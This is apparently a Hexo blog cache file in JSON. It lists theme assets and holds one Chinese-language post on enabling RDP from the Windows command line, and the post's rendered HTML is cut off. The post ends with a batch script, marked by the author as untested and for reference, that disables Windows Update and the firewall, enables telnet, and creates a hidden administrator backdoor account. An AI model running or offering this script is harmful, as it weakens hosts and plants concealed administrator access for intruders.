{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/yilia/source/main.b3331d.css","path":"main.b3331d.css","modified":0,"renderable":1},{"_id":"themes/yilia/source/slider.445162.js","path":"slider.445162.js","modified":0,"renderable":1},{"_id":"source/img/dreamcruise.jpg","path":"img/dreamcruise.jpg","modified":0,"renderable":0},{"_id":"source/img/head.jpg","path":"img/head.jpg","modified":0,"renderable":0},{"_id":"themes/yilia/source/mobile.8d90af.js","path":"mobile.8d90af.js","modified":0,"renderable":1},{"_id":"themes/yilia/source/main.b3331d.js","path":"main.b3331d.js","modified":0,"renderable":1},{"_id":"themes/yilia/source/fonts/default-skin.b257fa.svg","path":"fonts/default-skin.b257fa.svg","modified":0,"renderable":1},{"_id":"themes/yilia/source/fonts/iconfont.3a9902.eot","path":"fonts/iconfont.3a9902.eot","modified":0,"renderable":1},{"_id":"themes/yilia/source/fonts/iconfont.6e162c.woff","path":"fonts/iconfont.6e162c.woff","modified":0,"renderable":1},{"_id":"themes/yilia/source/fonts/iconfont.9abe9f.svg","path":"fonts/iconfont.9abe9f.svg","modified":0,"renderable":1},{"_id":"themes/yilia/source/fonts/iconfont.d0da7e.ttf","path":"fonts/iconfont.d0da7e.ttf","modified":0,"renderable":1},{"_id":"themes/yilia/source/fonts/tooltip.4004ff.svg","path":"fonts/tooltip.4004ff.svg","modified":0,"renderable":1},{"_id":"themes/yilia/source/img/default-skin.png","path":"img/default-skin.png","modified":0,"renderable":1},{"_id":"themes/yilia/source/img/preloader.gif","path":"img/preloader.gif","modified":0,"renderable":1},{"_id":"themes/yilia/source/img/scrollbar_arrow.png","path":"img/scrollbar_arrow.png","modified":0,"renderable":1}],"Cache":[{"_id":"source/.DS_Store","hash":"7e27fcb3251b696405af60cb480f2ed7d9df1265","modified":1496746291000},{"_id":"themes/yilia/.babelrc","hash":"b1b76475ac17dc9e2fa50af96c9e31eea2d0f2b4","modified":1496554360000},{"_id":"themes/yilia/.DS_Store","hash":"3161af20764b3438bfe0741be026b8b6c9fc9596","modified":1496740672000},{"_id":"themes/yilia/.editorconfig","hash":"da6d022b8f4d9c961e2f8f80677e92af8de0db4d","modified":1496554360000},{"_id":"themes/yilia/.gitattributes","hash":"e0f24dceeb1e6878a1dd9b01a2b9df1bc037a867","modified":1496554360000},{"_id":"themes/yilia/.eslintrc.js","hash":"5696ae049de010ed3786768b0c359f14c05b5ec6","modified":1496554360000},{"_id":"themes/yilia/.eslintignore","hash":"df0a50b13cc00acb749226fee3cee6e0351fb1d9","modified":1496554360000},{"_id":"themes/yilia/README.md","hash":"8444a63c50d8a7e40bb3f1f10e549a60da94a21f","modified":1496554360000},{"_id":"themes/yilia/.gitignore","hash":"9c4b7d27a1e3e5efa0c8ed143a032a85d586b03b","modified":1496554360000},{"_id":"themes/yilia/_config.yml","hash":"737e47b0e3fd98f7c35e61c87de7e0f18806af5e","modified":1496585058000},{"_id":"themes/yilia/package.json","hash":"367cb9579d35968a942c243ab248a5f5ebfaf462","modified":1496554360000},{"_id":"themes/yilia/webpack.config.js","hash":"05ba46a4ae744272f5312e684928910dccad3755","modified":1496554360000},{"_id":"source/_posts/Enable-RDP-through-cmd-line.md","hash":"ebfa3aa25f3356b5b63634f2ccbecd73f2ac5bee","modified":1493205768000},{"_id":"source/_posts/Mac-SIP.md","hash":"6f96dbd4831a62807246c4282562768f796d21cb","modified":1493205621000},{"_id":"source/_posts/Nmap-cheat-sheet.md","hash":"57de71226dab62db8849057abb5ed5cdd4ed33c7","modified":1494314802000},{"_id":"source/_posts/Python-argparse模块详解.md","hash":"02bfec6497d0bd81691ea2a2ce9425141f2a4554","modified":1496925758000},{"_id":"source/_posts/Pandoc-a-universal-document-converter.md","hash":"67d626b45923f4c8dd4f19289248201e4791fca4","modified":1496741447000},{"_id":"source/img/.DS_Store","hash":"2e5a4ee78f19d2764d8336e9bf9048ea1ab54d84","modified":1496741273000},{"_id":"source/_posts/hello-world.md","hash":"bb9d09dc40a077ec95bc2d060b152e471c281d14","modified":1492742124000},{"_id":"source/_posts/install-homebrew-and-wine-on-mac.md","hash":"854ba0eeaf1f1113ae800c9459359b8f9defde53","modified":1494914570000},{"_id":"source/_posts/弱口令检测工具fenghuangscanner的安装与使用.md","hash":"215a44d59fd29f62cce364a9c07453ed1b44b41f","modified":1494943241000},{"_id":"themes/yilia/.git/HEAD","hash":"acbaef275e46a7f14c1ef456fff2c8bbe8c84724","modified":1496554360000},{"_id":"themes/yilia/.git/description","hash":"9635f1b7e12c045212819dd934d809ef07efa2f4","modified":1496554350000},{"_id":"themes/yilia/.git/index","hash":"cd7f36823ef10ef67c6c7facaea3e48b42de364d","modified":1496554910000},{"_id":"themes/yilia/.git/config","hash":"256e47c5a4386e6881318e44d2a716fdc3197863","modified":1496554360000},{"_id":"themes/yilia/.git/packed-refs","hash":"cf41ff42218453f57f86f8bf8a37ce6b19a31ad9","modified":1496554360000},{"_id":"themes/yilia/languages/fr.yml","hash":"84ab164b37c6abf625473e9a0c18f6f815dd5fd9","modified":1496554360000},{"_id":"themes/yilia/languages/no.yml","hash":"965a171e70347215ec726952e63f5b47930931ef","modified":1496554360000},{"_id":"themes/yilia/languages/ru.yml","hash":"4fda301bbd8b39f2c714e2c934eccc4b27c0a2b0","modified":1496554360000},{"_id":"themes/yilia/languages/nl.yml","hash":"12ed59faba1fc4e8cdd1d42ab55ef518dde8039c","modified":1496554360000},{"_id":"themes/yilia/languages/default.yml","hash":"3083f319b352d21d80fc5e20113ddf27889c9d11","modified":1496554360000},{"_id":"themes/yilia/languages/zh-CN.yml","hash":"ca40697097ab0b3672a80b455d3f4081292d1eed","modified":1496554360000},{"_id":"themes/yilia/layout/archive.ejs","hash":"2703b07cc8ac64ae46d1d263f4653013c7e1666b","modified":1496554360000},{"_id":"themes/yilia/layout/category.ejs","hash":"765426a9c8236828dc34759e604cc2c52292835a","modified":1496554360000},{"_id":"themes/yilia/layout/index.ejs","hash":"a35dc900203f9d8dd863ea4c1722198d6d457ec8","modified":1496554360000},{"_id":"themes/yilia/layout/layout.ejs","hash":"0a332bdbd3b86c231d690614687f5b97186b85d5","modified":1496554360000},{"_id":"themes/yilia/languages/zh-tw.yml","hash":"53ce3000c5f767759c7d2c4efcaa9049788599c3","modified":1496554360000},{"_id":"themes/yilia/layout/page.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1496554360000},{"_id":"themes/yilia/layout/post.ejs","hash":"7d80e4e36b14d30a7cd2ac1f61376d9ebf264e8b","modified":1496554360000},{"_id":"themes/yilia/layout/tag.ejs","hash":"eaa7b4ccb2ca7befb90142e4e68995fb1ea68b2e","modified":1496554360000},{"_id":"themes/yilia/source/main.b3331d.css","hash":"7d0162a4618e8026bd23779f3120c09c83197b9f","modified":1496554360000},{"_id":"themes/yilia/source/slider.445162.js","hash":"e21c3c2cf663d7a4fb0d77f43ae1a148553a7cca","modified":1496554360000},{"_id":"themes/yilia/source-src/css.ejs","hash":"94dbdb02ca11849e415d54fb28546a598f2cffb1","modified":1496554360000},{"_id":"themes/yilia/source-src/script.ejs","hash":"c21381e1317db7bb157f1d182b8c088cb7cba411","modified":1496554360000},{"_id":"source/img/dreamcruise.jpg","hash":"7120181b492a7bf56ded61929e93170036cb4696","modified":1496741213000},{"_id":"source/img/head.jpg","hash":"b31be7322900b9f9c2f9ba42fa8de8c83f4e1a8c","modified":1496581954000},{"_id":"themes/yilia/source/mobile.8d90af.js","hash":"cf2ab659138db5abc70e3e0d7bc64f50d48e834d","modified":1496554360000},{"_id":"themes/yilia/source/main.b3331d.js","hash":"0e98e3674c7687ae4ff7bdcecb05e15434c46e0d","modified":1496554360000},{"_id":"themes/yilia/.git/hooks/commit-msg.sample","hash":"ee1ed5aad98a435f2020b6de35c173b75d9affac","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/applypatch-msg.sample","hash":"4de88eb95a5e93fd27e78b5fb3b5231a8d8917dd","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/post-update.sample","hash":"b614c2f63da7dca9f1db2e7ade61ef30448fc96c","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/pre-applypatch.sample","hash":"f208287c1a92525de9f5462e905a9d31de1e2d75","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/pre-commit.sample","hash":"36aed8976dcc08b5076844f0ec645b18bc37758f","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/pre-push.sample","hash":"5c8518bfd1d1d3d2c1a7194994c0a16d8a313a41","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/pre-receive.sample","hash":"705a17d259e7896f0082fe2e9f2c0c3b127be5ac","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/pre-rebase.sample","hash":"5885a56ab4fca8075a05a562d005e922cde9853b","modified":1496554350000},{"_id":"themes/yilia/.git/info/exclude","hash":"c879df015d97615050afa7b9641e3352a1e701ac","modified":1496554350000},{"_id":"themes/yilia/.git/logs/HEAD","hash":"38a52f848a7a3271801e38cca920280e87570062","modified":1496554360000},{"_id":"themes/yilia/.git/hooks/prepare-commit-msg.sample","hash":"2b6275eda365cad50d167fe3a387c9bc9fedd54f","modified":1496554350000},{"_id":"themes/yilia/.git/hooks/update.sample","hash":"e729cd61b27c128951d139de8e7c63d1a3758dde","modified":1496554350000},{"_id":"themes/yilia/layout/_partial/after-footer.ejs","hash":"143710485f734c5a997e0b1c26192bbba2982bcc","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/baidu-analytics.ejs","hash":"f0e6e88f9f7eb08b8fe51449a8a3016273507924","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/archive-post.ejs","hash":"1f7d4819b7f67602c4a1b99871808d2160b60978","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/footer.ejs","hash":"f2994e0acd1d606ebf4680afc4fa652e148ccf4e","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/article.ejs","hash":"7547bc40b533d9db62f430c43dc0e595c9caa5b6","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/css.ejs","hash":"f8a42263edeeb3ccf6115cea5f96f551ed1e76e5","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/left-col.ejs","hash":"2387d91cf94b0b36e8a36841992a5fce63ebd069","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/archive.ejs","hash":"a6e94061ac55b9eb55275f87b608d62f6ea35659","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/head.ejs","hash":"64f092186b5a744aa1603ce22bb1d44a34446add","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/mathjax.ejs","hash":"151a1ef2173ba7b6789d349f0f8da89616cc1394","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/mobile-nav.ejs","hash":"7fbbfabf5e29525b24ada14613c21a26789132b4","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/google-analytics.ejs","hash":"f921e7f9223d7c95165e0f835f353b2938e40c45","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/tools.ejs","hash":"c41341b9618e591538e1136a2d1637587c1bbd90","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/header.ejs","hash":"6387a93dad7c3d778eb91e3821852fbf6813880c","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/viewer.ejs","hash":"e495790b2abe2290875817e42bd505bc611d3e26","modified":1496554360000},{"_id":"themes/yilia/source/fonts/default-skin.b257fa.svg","hash":"2ac727c9e092331d35cce95af209ccfac6d4c7c7","modified":1496554360000},{"_id":"themes/yilia/source/fonts/iconfont.3a9902.eot","hash":"51d4e8d333ae7867915037983ea5d4b2ad971930","modified":1496554360000},{"_id":"themes/yilia/source/fonts/iconfont.6e162c.woff","hash":"709373d566526ad4bdb330757a3915e3c5e37b66","modified":1496554360000},{"_id":"themes/yilia/source/fonts/iconfont.9abe9f.svg","hash":"772383b62548e2a4fa560d589e05929b9f6f7f7b","modified":1496554360000},{"_id":"themes/yilia/source/fonts/iconfont.d0da7e.ttf","hash":"53ea5a5027a2fab93bcdad18cad6dc5f1b728726","modified":1496554360000},{"_id":"themes/yilia/source/fonts/tooltip.4004ff.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1496554360000},{"_id":"themes/yilia/source/img/default-skin.png","hash":"ed95a8e40a2c3478c5915376acb8e5f33677f24d","modified":1496554360000},{"_id":"themes/yilia/source/img/preloader.gif","hash":"6342367c93c82da1b9c620e97c84a389cc43d96d","modified":1496554360000},{"_id":"themes/yilia/source-src/js/anm.js","hash":"4a4c5d82b09a3063f91a434388e6aa064fd7fd98","modified":1496554360000},{"_id":"themes/yilia/source/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1496554360000},{"_id":"themes/yilia/source-src/js/browser.js","hash":"04095b38cfd4316a23f8eb14b1ffaf95f78a4260","modified":1496554360000},{"_id":"themes/yilia/source-src/js/fix.js","hash":"9591a0f61236a56b2a15a541f572bcfd93823a0f","modified":1496554360000},{"_id":"themes/yilia/source-src/js/main.js","hash":"d665f4cf30450984591bc8ad2348a1baf720d04b","modified":1496554360000},{"_id":"themes/yilia/source-src/js/report.js","hash":"4f1d9a18a936ce40b037f636a39127dd19175b6e","modified":1496554360000},{"_id":"themes/yilia/source-src/js/Q.js","hash":"d011af172064b6c6e0c7051d8f9879373ddac113","modified":1496554360000},{"_id":"themes/yilia/source-src/js/mobile.js","hash":"4d823b039fd296d24a454eae5a798b93c44560cb","modified":1496554360000},{"_id":"themes/yilia/source-src/js/share.js","hash":"b090f82cf80cba7da764753906d9e2cc2acdf30d","modified":1496554360000},{"_id":"themes/yilia/source-src/js/slider.js","hash":"3bf0d70ae171404a0dc73c33ec48927fc2521a54","modified":1496554360000},{"_id":"themes/yilia/source-src/js/util.js","hash":"8456e9d6b19532742582c99b2fb9d09e146e1c58","modified":1496554360000},{"_id":"themes/yilia/source-src/js/viewer.js","hash":"808a2e1ed407984cfdc929b827d3638f70ec9a2a","modified":1496554360000},{"_id":"themes/yilia/source-src/css/_function.scss","hash":"93a50dd19a93485712da1f8d0a1672482dd1eabc","modified":1496554360000},{"_id":"themes/yilia/source-src/css/_core.scss","hash":"24f347a2412abbf58318369152504da9538f8d3b","modified":1496554360000},{"_id":"themes/yilia/source-src/css/archive.scss","hash":"7d27e22ac898e8fafec14549e940c73cbea1fba8","modified":1496554360000},{"_id":"themes/yilia/source-src/css/article-inner.scss","hash":"d79f2d35a06de83a2a226ca790b7a0a34789c115","modified":1496554360000},{"_id":"themes/yilia/source-src/css/article-nav.scss","hash":"43e507f2a48504079afd9471353337e23ca47470","modified":1496554360000},{"_id":"themes/yilia/source-src/css/article-main.scss","hash":"3fad68bd74260326f83090b0974dd80707e7bac7","modified":1496554360000},{"_id":"themes/yilia/source-src/css/article.scss","hash":"0f6d61af99ed4db87f8589db1feaea7747b55963","modified":1496554360000},{"_id":"themes/yilia/source-src/css/comment.scss","hash":"e6e83d4863afcc589d4dd2f327e9f396f7d7b343","modified":1496554360000},{"_id":"themes/yilia/source-src/css/fonts.scss","hash":"3f5808a49a7365e3f813f78ba96b692f7ca27886","modified":1496554360000},{"_id":"themes/yilia/source-src/css/footer.scss","hash":"7c995410b25baaf61dfc5e148e22ca60330abcd3","modified":1496554360000},{"_id":"themes/yilia/source-src/css/global.scss","hash":"b4cb4f45a55d4250cd9056f76dab2a3c0dabcec4","modified":1496554360000},{"_id":"themes/yilia/source-src/css/grid.scss","hash":"849a29fcd7150214fcf7b9715fa5dc71d1f9b896","modified":1496554360000},{"_id":"themes/yilia/source-src/css/highlight.scss","hash":"3719994c2c9393813cc1d42b657205c368a329cb","modified":1496554360000},{"_id":"themes/yilia/source-src/css/left.scss","hash":"0d30c0e7cdb831c3881a017006c782f2214ac195","modified":1496554360000},{"_id":"themes/yilia/source-src/css/mobile.scss","hash":"a40400734c6509b9ac6e393a6681ccd8bafed5eb","modified":1496554360000},{"_id":"themes/yilia/source-src/css/mobile-slider.scss","hash":"f053c609d84df0dd9eee1d11ddf0c19163a456be","modified":1496554360000},{"_id":"themes/yilia/source-src/css/main.scss","hash":"ac8c3312182519e33d0f729d157deb36e5f42894","modified":1496554360000},{"_id":"themes/yilia/source-src/css/page.scss","hash":"bf206bb7f7d0967bc8b7fdf01b7ffc99aff9ba88","modified":1496554360000},{"_id":"themes/yilia/source-src/css/reward.scss","hash":"80a4fcf9171d4a33235da96ac8a2b7dcabc45dfb","modified":1496554360000},{"_id":"themes/yilia/source-src/css/scroll.scss","hash":"9c8dfd1c76854ef063494ca76fac6360b391ed6d","modified":1496554360000},{"_id":"themes/yilia/source-src/css/social.scss","hash":"b5324302815491d0a5e63142f1ead2048ad3f72f","modified":1496554360000},{"_id":"themes/yilia/source-src/css/tags.scss","hash":"ac67a3c7097849206244db9b0ba91daaba017ef5","modified":1496554360000},{"_id":"themes/yilia/source-src/css/share.scss","hash":"150c6425f6582e7ec78a873256ce49c9930e8805","modified":1496554360000},{"_id":"themes/yilia/source-src/css/tools.scss","hash":"17a97f7c38f5dfacc3eadf354b5826d77f1c2bdb","modified":1496554360000},{"_id":"themes/yilia/source-src/css/tooltip.scss","hash":"53d5a554bc2f38e9bb3d26400a47767013c05216","modified":1496554360000},{"_id":"themes/yilia/source-src/css/tags-cloud.scss","hash":"c8aa84fca93862d3caae77c552873b8610f33327","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/script.ejs","hash":"6160c13783a7f31dab4fdcc6b752b3a368586d67","modified":1496554360000},{"_id":"themes/yilia/.git/refs/heads/master","hash":"597a0d14c701a189e5d74eaa70341e78e3ad7c80","modified":1496554360000},{"_id":"themes/yilia/.git/objects/pack/pack-f2369c56cc891d085db3c5f66951e1955cef61ae.idx","hash":"384a19007954ed5c14418b38a95a1c2f0cd3315c","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/changyan.ejs","hash":"9f9fa4f8b0de5f87a9494fd0cb5064502a5d5ef5","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/category.ejs","hash":"c2dccf1a95ec09ceeee5004293ac7edb7e1c9a66","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/date.ejs","hash":"ef71c4081e866a494367575c59610e7e6339ece0","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/duoshuo.ejs","hash":"e8399025ed3b980aedb821c92855889f5f12fd5b","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/nav.ejs","hash":"1036c8e4e1a7bc935ba173744da735a0d6ed09cd","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/share.ejs","hash":"341103df70d0b476e3acd0afbc507a4a120d8f5f","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/tag.ejs","hash":"2e783e68755abb852760eb0e627a3fbb50a05a55","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/wangyiyun.ejs","hash":"ea41c462168d9697caef9485862e9cac718a12c1","modified":1496554360000},{"_id":"themes/yilia/layout/_partial/post/title.ejs","hash":"2f275739b6f1193c123646a5a31f37d48644c667","modified":1496554360000},{"_id":"themes/yilia/source-src/css/core/_media-queries.scss","hash":"491ab3378d5c11005ba65c607608bb36b368a9d5","modified":1496554360000},{"_id":"themes/yilia/source-src/css/core/_animation.scss","hash":"63a37f26276f9207405afe0f2d65339ce295bbaf","modified":1496554360000},{"_id":"themes/yilia/source-src/css/core/_reset.scss","hash":"fab871fa93bd542e76a71a56428f2994a4aaf443","modified":1496554360000},{"_id":"themes/yilia/source-src/css/core/_mixin.scss","hash":"3bba5c77bad5981eac859fe05c9561d580ba7fa9","modified":1496554360000},{"_id":"themes/yilia/source-src/css/core/_variables.scss","hash":"fb511c505d1309249f21dc577d4ad2bad99a764f","modified":1496554360000},{"_id":"themes/yilia/source-src/css/fonts/iconfont.eot","hash":"51d4e8d333ae7867915037983ea5d4b2ad971930","modified":1496554360000},{"_id":"themes/yilia/source-src/css/fonts/iconfont.woff","hash":"709373d566526ad4bdb330757a3915e3c5e37b66","modified":1496554360000},{"_id":"themes/yilia/source-src/css/fonts/iconfont.svg","hash":"772383b62548e2a4fa560d589e05929b9f6f7f7b","modified":1496554360000},{"_id":"themes/yilia/source-src/css/fonts/iconfont.ttf","hash":"53ea5a5027a2fab93bcdad18cad6dc5f1b728726","modified":1496554360000},{"_id":"themes/yilia/source-src/css/img/checkered-pattern.png","hash":"049262fa0886989d750637b264bed34ab51c23c8","modified":1496554360000},{"_id":"themes/yilia/source-src/css/img/scrollbar_arrow.png","hash":"d64a33c4ddfbdb89deeb6f4e3d36eb84dc4777c0","modified":1496554360000},{"_id":"themes/yilia/source-src/css/img/tooltip.svg","hash":"397fe4b1093bf9b62457dac48aa15dac06b54a3c","modified":1496554360000},{"_id":"themes/yilia/.git/logs/refs/heads/master","hash":"38a52f848a7a3271801e38cca920280e87570062","modified":1496554360000},{"_id":"themes/yilia/.git/refs/remotes/origin/HEAD","hash":"d9427cda09aba1cdde5c69c2b13c905bddb0bc51","modified":1496554360000},{"_id":"themes/yilia/.git/logs/refs/remotes/origin/HEAD","hash":"38a52f848a7a3271801e38cca920280e87570062","modified":1496554360000},{"_id":"themes/yilia/.git/objects/pack/pack-f2369c56cc891d085db3c5f66951e1955cef61ae.pack","hash":"7150189603e28ed623058f3264ffb558a007ff59","modified":1496554360000},{"_id":"public/content.json","hash":"29871bf2c3851ec3d5b09c0edf66bdd131804e80","modified":1496925826919},{"_id":"public/2017/04/Mac-SIP/index.html","hash":"f66d30d4590fc3f078bb76cf7ed0b2cbeb112d6e","modified":1496925827337},{"_id":"public/2017/04/hello-world/index.html","hash":"dc6522699f1ff1e8223eb0c5223e38ada6d531e5","modified":1496925827396},{"_id":"public/2017/04/Enable-RDP-through-cmd-line/index.html","hash":"d59971a5c461f48004a019c686a851c13ecd5d0f","modified":1496925827400},{"_id":"public/2017/05/Pandoc-a-universal-document-converter/index.html","hash":"6ddce24bc07661a6476416c5de88c9aca39b23f6","modified":1496925827400},{"_id":"public/2017/05/Nmap-cheat-sheet/index.html","hash":"ccbef9c955d7efdc2cb4afa4d48246063c8a2766","modified":1496925827400},{"_id":"public/2017/05/install-homebrew-and-wine-on-mac/index.html","hash":"5e7d1104662524337d9c4adb55b188c69f7b7966","modified":1496925827401},{"_id":"public/2017/05/弱口令检测工具fenghuangscanner的安装与使用/index.html","hash":"f67feac11a750de1887325992adce404b7aea575","modified":1496925827401},{"_id":"public/index.html","hash":"1c7153100ca064301547c2d634be3e0d3b1b79d1","modified":1496925827401},{"_id":"public/archives/index.html","hash":"78ddde0f7bf5cebaf65fcd44b398f4b25d323c20","modified":1496925827401},{"_id":"public/archives/2017/index.html","hash":"f75376e69ad3fee44beaade08c86c5080c825506","modified":1496925827401},{"_id":"public/archives/2017/04/index.html","hash":"86d19e9ec0f1c6b8e081d54953a8aed5d6de32db","modified":1496925827401},{"_id":"public/archives/2017/05/index.html","hash":"53c7a9ada6e911585f7c2deea402a1004a807f87","modified":1496925827401},{"_id":"public/2017/06/Python-argparse模块详解/index.html","hash":"55f1d2b010af40de982fb59021e7757059850c82","modified":1496925827402},{"_id":"public/archives/2017/06/index.html","hash":"96d74b06487354f4e642c7566ce95e22212eba91","modified":1496925827402},{"_id":"public/tags/Python/index.html","hash":"fecd86caaf9789fef1002f109f6ac18a7025a31c","modified":1496925827403},{"_id":"public/img/dreamcruise.jpg","hash":"7120181b492a7bf56ded61929e93170036cb4696","modified":1496925827406}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"Enable RDP through cmd line","date":"2017-04-26T11:21:29.000Z","_content":"## 开启RDP\n通过命令行修改注册表。\n\n```bash\n# 开启RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# 关闭RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n```\n\n## RDP端口\n\n```bash\n# 查询rdp端口号\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n```\n## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)\n```bash\n# 防火墙状态\nnetsh advfirewall monitor show firewall\n\n# 允许访问3389端口\nnetsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n\n# 关闭防火墙\nnetsh firewall set opmode mode=disable\n\n```\n\n## 开启远程协助\n```bash\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\n## 其它\n```bash\n# 从进程中查找rdp进程\ntasklist  /svc | find \"TermService\"\n# 根据pid（1316）查询端口号\nnetstat -ano | find \"1316\"\n```\n\n\n\n## 脚本(maybe dangerous)  <未实际使用，仅供参考>\n```bash\n@echo off\n\nREM ****************\nREM Disable off \"AUTO UPDATE\"\nREM ****************\nsc config wuauserv start= disabled\nnet stop wuauserv\n\nREM ****************\nREM Disable windows xp Firewall\nREM ****************\nnetsh firewall set opmode disable\n\nREM ****************\nREM Enable TELNET\nREM ****************\nsc config tlntsvr start= auto\nnet start telnet\n\nREM ****************\nREM Enable Remote Desktop\nREM ****************\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nREM ***************\nREM Create a HIDDEN USER usr= hack007, pass= dani\nREM ***************\nnet user hacker007 dani /add\nnet localgroup \"Administrators\" /add hacker007\nnet localgroup \"Users\" /del hacker007\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker007 /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\n\n```","source":"_posts/Enable-RDP-through-cmd-line.md","raw":"---\ntitle: Enable RDP through cmd line\ndate: 2017-04-26 19:21:29\ntags:\n---\n## 开启RDP\n通过命令行修改注册表。\n\n```bash\n# 开启RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# 关闭RDP\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n# 查询fDenyTSConnections值   0表示RDP开启    1表示RDP关闭\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\n\n```\n\n## RDP端口\n\n```bash\n# 查询rdp端口号\nreg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber\n\n```\n## 防火墙相关 [Netsh AdvFirewall](https://technet.microsoft.com/en-us/library/dd736198(v=ws.10).aspx)\n```bash\n# 防火墙状态\nnetsh advfirewall monitor show firewall\n\n# 允许访问3389端口\nnetsh advfirewall firewall add rule name=\"Open Port 3389\" dir=in action=allow protocol=TCP localport=3389\n\n# 关闭防火墙\nnetsh firewall set opmode mode=disable\n\n```\n\n## 开启远程协助\n```bash\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```\n\n## 其它\n```bash\n# 从进程中查找rdp进程\ntasklist  /svc | find \"TermService\"\n# 根据pid（1316）查询端口号\nnetstat -ano | find \"1316\"\n```\n\n\n\n## 脚本(maybe dangerous)  <未实际使用，仅供参考>\n```bash\n@echo off\n\nREM ****************\nREM Disable off \"AUTO UPDATE\"\nREM ****************\nsc config wuauserv start= disabled\nnet stop wuauserv\n\nREM ****************\nREM Disable windows xp Firewall\nREM ****************\nnetsh firewall set opmode disable\n\nREM ****************\nREM Enable TELNET\nREM ****************\nsc config tlntsvr start= auto\nnet start telnet\n\nREM ****************\nREM Enable Remote Desktop\nREM ****************\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\nREM ***************\nREM Create a HIDDEN USER usr= hack007, pass= dani\nREM ***************\nnet user hacker007 dani /add\nnet localgroup \"Administrators\" /add hacker007\nnet localgroup \"Users\" /del hacker007\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v hacker007 /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f\n\n```","slug":"Enable-RDP-through-cmd-line","published":1,"updated":"2017-04-26T11:22:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj3oaflsv0000a8uvxd5dso89","content":"<h2 id=\"开启RDP\"><a href=\"#开启RDP\" class=\"headerlink\" title=\"开启RDP\"></a>开启RDP</h2><p>通过命令行修改注册表。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div 